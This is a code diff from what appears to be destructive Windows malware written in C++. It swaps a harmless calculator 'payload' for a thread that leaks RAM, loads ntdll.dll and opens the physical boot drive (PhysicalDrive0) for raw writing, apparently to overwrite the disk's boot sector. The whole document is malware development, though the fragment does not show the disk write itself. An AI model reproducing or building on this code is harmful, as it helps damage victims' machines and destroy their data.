@@ -1,5 +1,9 @@
 #pragma comment(lib, "Winmm.lib")
 
+#ifdef UNICODE
+#undef UNICODE
+#endif
+
 #include <iostream>
 #include <Windows.h>
 #include <math.h>
@@ -76,11 +80,10 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
     }
 
     functionarray payloads[] = {
-        startcalc,
+        leakram,
         p1,
         p2,
-        p3,
-        p4
+        p3
     }; // use: payloads[x]() for function px(). why use this? functions in random order, im still working on porting all payloads to payloads.h
 
     HMODULE ntdll = LoadLibraryA("ntdll.dll");
@@ -111,9 +114,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpStr, IN
 
     HANDLE hAudio = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)audio, NULL, 0, NULL);
 
-    //HANDLE calc = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);
-
-    HANDLE hLeakRAM = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[4], NULL, 0, NULL);
+    HANDLE hLeakRAM = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)payloads[0], NULL, 0, NULL);
 
     DWORD dwBytesWritten;
     HANDLE hDevice = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
